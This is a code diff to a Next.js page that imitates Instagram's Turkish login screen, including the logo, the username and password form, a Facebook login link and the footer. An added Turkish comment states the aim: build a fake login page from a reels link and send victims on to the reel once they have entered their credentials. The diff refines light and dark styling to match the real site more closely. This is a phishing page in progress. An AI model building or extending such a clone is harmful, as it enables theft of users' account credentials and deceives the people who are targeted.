@@ -7,7 +7,9 @@ import playstore from "@/../public/playstore.png";
 import microsoft from "@/../public/microsoft.png";
 import Link from 'next/link';
 // dark:invert
+// reels linki ver reels linki ile sahte login page'i oluştursun bu login page'e giriş yaptığında reels'e yönlendirsin
 export default function Home() {
+  //await new Promise(resolve => setTimeout(resolve, 3000))
   const [usernameValue, setUsernameValue] = useState('');
   const [passwordValue, setPasswordValue] = useState('');
 
@@ -23,12 +25,20 @@ export default function Home() {
   };
 
   return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
+    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
       <main className="space-y-4 row-start-2 items-center sm:items-start w-full max-w-[350px]">
-        <div className="flex flex-col gap-8 border border-[#363636] p-10 w-full">
+        <div className="flex flex-col gap-8 border border-[#DBDBDB] dark:border-[#363636] p-10 w-full">
           <div className="flex justify-center w-full">
             <Image
-              className="pt-4"
+              className="pt-4 block dark:hidden"
+              src="/instagram-black.png"
+              alt="Instagram logo"
+              width={180}
+              height={38}
+              priority
+            />
+            <Image
+              className="pt-4 hidden dark:block"
               src="/instagram-white.png"
               alt="Instagram logo"
               width={180}
@@ -42,14 +52,14 @@ export default function Home() {
               onSubmit={handleSubmit}
               className="flex flex-col justify-center items-center gap-2 w-full"
             >
-              <div className="relative w-full border border-1 border-[#555555] rounded-lg">
+              <div className="relative w-full border border-1 border-[#DBDBDB] dark:border-[#555555] rounded-lg">
                 <input
                   required
                   type="text"
                   id="username"
                   name="username"
                   aria-label="Telefon numarası, kullanıcı adı veya e-posta"
-                  className="w-full h-11 rounded-lg text-xs bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
+                  className="w-full h-11 rounded-lg text-xs bg-[#FAFAFA] dark:bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
                   autoComplete="off"
                   value={usernameValue}
                   onChange={handleUsernameChange}
@@ -64,13 +74,13 @@ export default function Home() {
                 </label>
               </div>
 
-              <div className="relative w-full border border-1 border-[#555555] rounded-lg">
+              <div className="relative w-full border border-1 border-[#DBDBDB] dark:border-[#555555] rounded-lg">
                 <input
                   required
                   type="password"
                   id="password"
                   name="password"
-                  className="w-full h-11 rounded-lg text-xs bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
+                  className="w-full h-11 rounded-lg text-xs bg-[#FAFAFA] dark:bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
                   autoComplete="off"
                   value={passwordValue}
                   onChange={handlePasswordChange}
@@ -86,7 +96,7 @@ export default function Home() {
               </div>
 
               <button
-                className="h-[32px] flex items-center justify-center rounded-xl bg-[#0069AD] text-[#F5F5F5] font-medium text-base font-roboto w-full"
+                className="h-[32px] flex items-center justify-center rounded-xl bg-[#4CB5F9] dark:bg-[#0069AD] text-[#F5F5F5] font-medium text-base font-roboto w-full"
                 type="submit"
               >
                 Giriş yap
@@ -94,23 +104,24 @@ export default function Home() {
             </form>
 
             <span className="flex flex-row items-center py-4">
-              <hr className="flex-1 h-px border-0 bg-[#262626]" />
-              <p className="text-xs px-2 font-robot text-[#A8A8A8]">YA DA</p>
-              <hr className="flex-1 h-px border-0 bg-[#262626]" />
+              <hr className="flex-1 h-px border-0 bg-[#DBDBDB] dark:bg-[#262626]" />
+              <p className="text-xs px-2 font-roboto text-[#737373] dark:text-[#A8A8A8]">YA DA</p>
+              <hr className="flex-1 h-px border-0 bg-[#DBDBDB] dark:bg-[#262626]" />
             </span>
 
             <div className="flex flex-col gap-2">
               <Link
-                className="flex items-center justify-center w-full"
+                className="flex items-center gap-1 justify-center w-full"
                 href="/"
               >
                 <Image
                   src={facebook}
                   width={30}
                   height={30}
-                  alt="Picture of the author"
+                  className='fill-[#2c76bb]'
+                  alt="Facebook icon"
                 />
-                <p className="font-[500] font-roboto text-[#3897F1]">
+                <p className="text-sm font-[500] dark:font-[600] font-roboto text-[#2c76bb] dark:text-[#3897F1]">
                   Facebook ile Giriş Yap
                 </p>
               </Link>
@@ -122,12 +133,12 @@ export default function Home() {
           </div>
         </div>
 
-        <div className="flex flex-col gap-8 border border-[#363636] p-6 w-full">
+        <div className="flex flex-col gap-8 border border-[#DBDBDB] dark:border-[#363636] p-6 w-full">
           <p className="text-sm text-center font-roboto">
             Hesabın yok mu?{" "}
             <Link
               href="/"
-              className="text-sm font-roboto font-[500] text-[#3897F1]"
+              className="text-sm font-roboto font-[500] text-[#0095F7] dark:text-[#3897F1]"
             >
               Kaydol
             </Link>
@@ -135,7 +146,7 @@ export default function Home() {
         </div>
 
         <div className='space-y-2'>
-          <p className='text-center'>Uygulamayı indir.</p>
+          <p className='text-center text-sm'>Uygulamayı indir.</p>
           <span className='flex justify-center gap-2'>
             <Image
               src={playstore}
@@ -152,7 +163,7 @@ export default function Home() {
           </span>
         </div>
       </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center text-xs text-[#A8A8A8]">
+      <footer className="row-start-3 flex my-6 gap-6 flex-wrap items-center justify-center text-xs text-[#737373] dark:text-[#A8A8A8]">
         <a>Meta</a>
         <a>Hakkında</a>
         <a>İş Fırsatları</a>
